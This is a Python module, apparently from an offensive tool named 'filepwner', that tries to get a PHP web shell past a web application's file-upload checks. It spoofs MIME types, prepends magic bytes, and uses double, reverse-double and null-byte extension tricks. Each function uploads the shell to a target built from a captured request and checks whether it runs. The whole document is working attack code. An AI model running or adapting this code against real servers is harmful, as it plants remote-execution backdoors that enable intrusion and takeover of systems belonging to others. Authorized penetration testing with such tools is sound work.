from filepwner import parse_request_file, upload, info, debug, progress_bar, options, check_shell, check_success, success, error, exit_success, failure, upload_and_validate
import variations
import time


def mimetype_spoofing(request_file, session, options, accepted_extensions):
    print()
    info("Mime type spoofing", spacing=False)
    print()

    simple_shell_path = "assets/shells/simple.php"
    
    for extension in accepted_extensions:
        mimetype = variations.mimetypes[extension]
        #if (options.global_verbosity < 2): progress_bar(accepted_extensions.index(extension)+1, len(accepted_extensions)*2)
        with open(simple_shell_path, 'rb') as file: file_data = file.read()

        file_extension = ".php"
        message = f"{simple_shell_path}, {file_extension}, {mimetype}, magic bytes: OFF"
        session = upload_and_validate(request_file, session, file_data, file_extension, mimetype, message)

        #with magic bytes
        file_data = variations.magic_bytes[extension] + file_data
        message = f"{simple_shell_path}, {file_extension}, {mimetype}, magic bytes: ON"
        session = upload_and_validate(request_file, session, file_data, file_extension, mimetype, message)
    
    
def double_extension(request_file, session, options, accepted_extensions):
    print()
    info("Double extensions", spacing=False)
    print()

    content, headers, host, path = parse_request_file(request_file)
    simple_shell_path = "assets/shells/simple.php"
    
    for extension in accepted_extensions:
        mimetype_php = variations.mimetypes["php"]
        mimetype_original = variations.mimetypes[extension]
        #if (options.global_verbosity < 2): progress_bar(accepted_extensions.index(extension)+1, len(accepted_extensions)*3)
        with open(simple_shell_path, 'rb') as file: file_data = file.read()

        #with php mimetype
        file_extension = f".{extension}.php"
        message = f"{simple_shell_path}, {file_extension}, {mimetype_php}, magic bytes: OFF"
        session = upload_and_validate(request_file, session, file_data, file_extension, mimetype_php, message)

        #with original mimetype bytes
        message = f"{simple_shell_path}, {file_extension}, {mimetype_original}, magic bytes: OFF"
        session = upload_and_validate(request_file, session, file_data, file_extension, mimetype_original, message)

        #with magic bytes and original mimetype
        file_data = variations.magic_bytes[extension] + file_data
        message = f"{simple_shell_path}, {file_extension}, {mimetype_original}, magic bytes: ON"
        session = upload_and_validate(request_file, session, file_data, file_extension, mimetype_original, message)


def reverse_double_extension(request_file, session, options, accepted_extensions):
    print()
    info("Reverse double extensions", spacing=False)
    print()

    content, headers, host, path = parse_request_file(request_file)
    simple_shell_path = "assets/shells/simple.php"
    
    for extension in accepted_extensions:
        mimetype_php = variations.mimetypes["php"]
        mimetype_original = variations.mimetypes[extension]
        #if (options.global_verbosity < 2): progress_bar(accepted_extensions.index(extension)+1, len(accepted_extensions)*3)
        with open(simple_shell_path, 'rb') as file: file_data = file.read()

        #with php mimetype
        file_extension = f".php.{extension}"
        message = f"{simple_shell_path}, {file_extension}, {mimetype_php}, magic bytes: OFF"
        session = upload_and_validate(request_file, session, file_data, file_extension, mimetype_php, message, expect_interaction=False)

        #with original mimetype bytes
        message = f"{simple_shell_path}, {file_extension}, {mimetype_original}, magic bytes: OFF"
        session = upload_and_validate(request_file, session, file_data, file_extension, mimetype_original, message, expect_interaction=False)

        #with magic bytes and original mimetype
        file_data = variations.magic_bytes[extension] + file_data
        message = f"{simple_shell_path}, {file_extension}, {mimetype_original}, magic bytes: ON"
        session = upload_and_validate(request_file, session, file_data, file_extension, mimetype_original, message, expect_interaction=False)

def null_byte_cutoff(request_file, session, options, accepted_extensions):
    print()
    info("Null byte cutoff", spacing=False)
    print()

    content, headers, host, path = parse_request_file(request_file)
    simple_shell_path = "assets/shells/simple.php"
    
    for extension in accepted_extensions:
        for null_byte in variations.null_bytes:
            mimetype_php = variations.mimetypes["php"]
            mimetype_original = variations.mimetypes[extension]
            #if (options.global_verbosity < 2): progress_bar(accepted_extensions.index(extension)+1, len(accepted_extensions)*3)
            with open(simple_shell_path, 'rb') as file: file_data = file.read()

            #with php mimetype
            file_extension = f".php{null_byte}.{extension}"
            message = f"{simple_shell_path}, {file_extension}, {mimetype_php}, magic bytes: OFF"
            session = upload_and_validate(request_file, session, file_data, file_extension, mimetype_php, message, expect_interaction=False, real_extension=".php")

            #with original mimetype bytes
            message = f"{simple_shell_path}, {file_extension}, {mimetype_original}, magic bytes: OFF"
            session = upload_and_validate(request_file, session, file_data, file_extension, mimetype_original, message, expect_interaction=False, real_extension=".php")

            #with magic bytes and original mimetype
            file_data = variations.magic_bytes[extension] + file_data
            message = f"{simple_shell_path}, {file_extension}, {mimetype_original}, magic bytes: ON"
            session = upload_and_validate(request_file, session, file_data, file_extension, mimetype_original, message, expect_interaction=False, real_extension=".php")